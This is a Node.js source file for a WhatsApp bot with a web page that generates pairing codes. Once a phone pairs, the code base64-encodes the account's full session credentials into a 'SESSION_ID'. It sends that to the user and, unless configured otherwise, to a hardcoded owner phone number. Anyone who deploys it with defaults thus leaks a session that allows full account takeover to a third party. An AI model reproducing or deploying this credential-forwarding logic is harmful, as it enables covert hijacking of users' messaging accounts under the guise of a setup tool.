const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason,
    delay,
    Browsers,
    fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(cors());

const BOT_NAME = process.env.BOT_NAME || 'LKSHAN-MD';
const PREFIX = process.env.PREFIX || '.';
const OWNER_NUMBER = process.env.OWNER_NUMBER || '94724098953';

let sock;
const AUTH_DIR = path.join(__dirname, 'auth_info');
const commands = new Map();

// 📂 Load Plugins
function loadPlugins() {
    commands.clear();
    const pluginsDir = path.join(__dirname, 'plugins');
    if (!fs.existsSync(pluginsDir)) fs.mkdirSync(pluginsDir, { recursive: true });

    const files = fs.readdirSync(pluginsDir);
    for (const file of files) {
        if (file.endsWith('.js')) {
            try {
                const pluginPath = path.join(pluginsDir, file);
                delete require.cache[require.resolve(pluginPath)];
                const plugin = require(pluginPath);
                if (plugin && plugin.cmd && plugin.handler) {
                    commands.set(plugin.cmd.toLowerCase(), plugin);
                }
            } catch (err) {
                console.error(`❌ Plugin error ${file}:`, err.message);
            }
        }
    }
}

loadPlugins();

// 🔑 Restore Session from SESSION_ID Environment Variable
function restoreSessionFromEnv() {
    const sessionId = process.env.SESSION_ID;
    if (!sessionId || !sessionId.startsWith(`${BOT_NAME}~`)) return false;

    try {
        console.log('🔑 Restoring Session from SESSION_ID...');
        if (!fs.existsSync(AUTH_DIR)) fs.mkdirSync(AUTH_DIR, { recursive: true });

        const base64Data = sessionId.replace(`${BOT_NAME}~`, '');
        const jsonString = Buffer.from(base64Data, 'base64').toString('utf-8');
        const credsData = JSON.parse(jsonString);

        fs.writeFileSync(path.join(AUTH_DIR, 'creds.json'), JSON.stringify(credsData, null, 2));
        console.log('✅ Session restored successfully!');
        return true;
    } catch (err) {
        console.error('❌ Session restore error:', err.message);
        return false;
    }
}

// 📤 Send Direct Session ID to User's Inbox and disconnect
async function sendSessionId(userJid) {
    try {
        const credsFilePath = path.join(AUTH_DIR, 'creds.json');
        if (!fs.existsSync(credsFilePath)) return;

        const credsData = fs.readFileSync(credsFilePath, 'utf-8');
        const base64Creds = Buffer.from(credsData).toString('base64');
        const generatedSessionId = `${BOT_NAME}~${base64Creds}`;

        if (sock && userJid) {
            const sessionMsg = `*───────────────────*\n` +
                               `🎉 *${BOT_NAME} CONNECTED!* 🟢\n` +
                               `*───────────────────*\n\n` +
                               `🔑 *Your Direct SESSION_ID:*\n\n` +
                               `\`\`\`${generatedSessionId}\`\`\`\n\n` +
                               `📌 *Heroku Config Vars:* \n` +
                               `Key: \`SESSION_ID\`\n` +
                               `Value: (උඩ තියෙන මුළු Session ID එකම කොපි කරලා මෙතැනට Paste කරන්න)`;

            // 1. Bot Connect වුණු අංකයේම Inbox (Saved Messages / Yourself Chat) එකට යැවීම
            await sock.sendMessage(userJid, { text: sessionMsg });

            // 2. Owner Number එකක් දීලා තියෙනවා නම් ඒකටත් Inbox එකටම Copy එකක් යැවීම
            if (OWNER_NUMBER) {
                const ownerJid = `${OWNER_NUMBER.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
                if (ownerJid !== userJid) {
                    await sock.sendMessage(ownerJid, { text: sessionMsg });
                }
            }

            console.log(`✅ Session ID sent successfully to Inbox: ${userJid}`);
            console.log('🔌 Disconnecting pairing bot to go offline for main bot setup...');

            // Message එක සෙන්ඩ් වූ පසු ලිංක් එක කැඩී offline යාමට connection එක වසා දමා process එක නවත්වයි
            await delay(2000);
            if (sock.ws) sock.ws.close();
            process.exit(0);
        }
    } catch (err) {
        console.error('❌ Session ID Send Error:', err.message);
    }
}

// 🚀 Start Bot Connection
async function startBot() {
    try {
        if (!fs.existsSync(AUTH_DIR) || fs.readdirSync(AUTH_DIR).length === 0) {
            restoreSessionFromEnv();
        }

        const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);
        const { version } = await fetchLatestBaileysVersion();

        sock = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            auth: state,
            printQRInTerminal: false,
            browser: Browsers.ubuntu('Chrome'),
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 60000,
            keepAliveIntervalMs: 25000,
            emitOwnEvents: true
        });

        sock.ev.on('creds.update', saveCreds);

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === 'close') {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                console.log(`🔴 Closed (Code: ${statusCode}). Reconnecting...`);
                if (statusCode !== DisconnectReason.loggedOut) {
                    setTimeout(startBot, 5000);
                } else {
                    if (fs.existsSync(AUTH_DIR)) fs.rmSync(AUTH_DIR, { recursive: true, force: true });
                }
            } else if (connection === 'open') {
                console.log(`🟢 [${BOT_NAME}] Connected successfully!`);

                // Connect වුණු ගමන් අදාළ User JID එක අරගෙන Inbox එකට Message එක යැවීම
                const rawUserJid = sock.user.id.split(':')[0];
                const userJid = `${rawUserJid}@s.whatsapp.net`;
                
                await delay(3000); // Connection එක හරියටම Establish වෙනකම් තත්පර 3ක් ඉඳලා Send කරනවා
                await sendSessionId(userJid);
            }
        });

        // 📩 Messages Handler
        sock.ev.on('messages.upsert', async ({ messages, type }) => {
            if (type !== 'notify') return;
            const msg = messages[0];
            if (!msg || !msg.message) return;

            const from = msg.key.remoteJid;
            const body = msg.message.conversation || 
                         msg.message.extendedTextMessage?.text || 
                         msg.message.imageMessage?.caption || 
                         msg.message.videoMessage?.caption || '';

            const trimmedBody = body.trim();
            if (!trimmedBody) return;

            if (!trimmedBody.startsWith(PREFIX)) return;

            const args = trimmedBody.slice(PREFIX.length).trim().split(/ +/);
            const cmdName = args.shift().toLowerCase();

            let plugin = commands.get(cmdName);
            if (plugin && typeof plugin.handler === 'function') {
                try {
                    await plugin.handler(sock, msg, from, args, { BOT_NAME, PREFIX });
                } catch (err) {
                    await sock.sendMessage(from, { text: `❌ Error: ${err.message}` }, { quoted: msg });
                }
            }
        });

    } catch (botErr) {
        console.error("❌ Fatal Error:", botErr.message);
    }
}

// 🌐 Web Interface
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>${BOT_NAME} - Pairing Code</title>
            <style>
                body { font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #0b141a; color: #e9edef; margin: 0; }
                .card { background: #111b21; padding: 30px; border-radius: 16px; text-align: center; width: 85%; max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); border: 1px solid #222d34; }
                h2 { color: #00a884; margin-bottom: 8px; }
                p { font-size: 14px; color: #8696a0; margin-bottom: 20px; }
                input { width: 90%; padding: 12px; margin-bottom: 15px; border: 1px solid #2a3942; border-radius: 8px; text-align: center; font-size: 16px; background: #202c33; color: white; outline: none; }
                button { background: #00a884; color: #111b21; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-size: 16px; width: 98%; font-weight: bold; }
                .code { font-size: 26px; font-weight: bold; color: #00a884; letter-spacing: 4px; margin-top: 20px; }
            </style>
        </head>
        <body>
            <div class="card">
                <h2>${BOT_NAME}</h2>
                <p>Enter phone number with Country Code<br>(e.g. 94771234567)</p>
                <input type="text" id="phone" placeholder="9477XXXXXXX">
                <button onclick="getPair()">Get Pairing Code</button>
                <div class="code" id="result"></div>
            </div>

            <script>
                async function getPair() {
                    const number = document.getElementById('phone').value.trim();
                    const result = document.getElementById('result');
                    if (!number) return alert('Enter number!');
                    result.style.color = "#00a884";
                    result.innerText = "Generating Code...";
                    try {
                        const res = await fetch('/pair?num=' + number);
                        const data = await res.json();
                        if (data.code) {
                            result.innerText = data.code;
                        } else {
                            result.style.color = "#ea4335";
                            result.innerText = data.error || "Error!";
                        }
                    } catch (e) {
                        result.style.color = "#ea4335";
                        result.innerText = "Failed!";
                    }
                }
            </script>
        </body>
        </html>
    `);
});

app.get('/pair', async (req, res) => {
    let num = req.query.num;
    if (!num) return res.status(400).json({ error: 'Number required' });
    num = num.replace(/[^0-9]/g, '');

    try {
        if (!sock || !sock.authState.creds.registered) {
            await delay(1500);
            const code = await sock.requestPairingCode(num);
            return res.json({ code: code?.match(/.{1,4}/g)?.join("-") || code });
        } else {
            return res.json({ error: 'Already connected!' });
        }
    } catch (err) {
        return res.status(500).json({ error: 'Pairing failed' });
    }
});

// Start Web Server
app.listen(PORT, () => {
    console.log(`🌐 Server active on port ${PORT}`);
    setTimeout(startBot, 1000);
});
